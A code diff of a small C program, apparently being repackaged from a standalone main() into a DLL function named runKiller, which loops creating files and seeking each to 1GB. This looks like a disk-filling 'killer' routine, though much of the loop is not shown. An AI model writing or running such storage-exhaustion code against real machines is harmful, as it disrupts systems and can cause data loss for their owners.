@@ -1,7 +1,6 @@
-#include <stdio.h>
-#include <string.h>
+#include "killer_dll.h"
 
-int main()
+int runKiller(int size) 
 {
     FILE *fp;
     char buffer[1];
@@ -18,7 +17,7 @@ int main()
         if (fp == NULL)
         {
             printf("Cannot open file\n");
-            return 1;
+            return 1; // 异常退出
         }
 
         fseek(fp, 1024 * 1024 * 1024 - 1, SEEK_SET); // 指针移动到1GB
@@ -26,5 +25,5 @@ int main()
 
         fclose(fp); // 关闭此次循环生成的文件
     }
-    return 0;
+    return 0; // 正常退出
 }
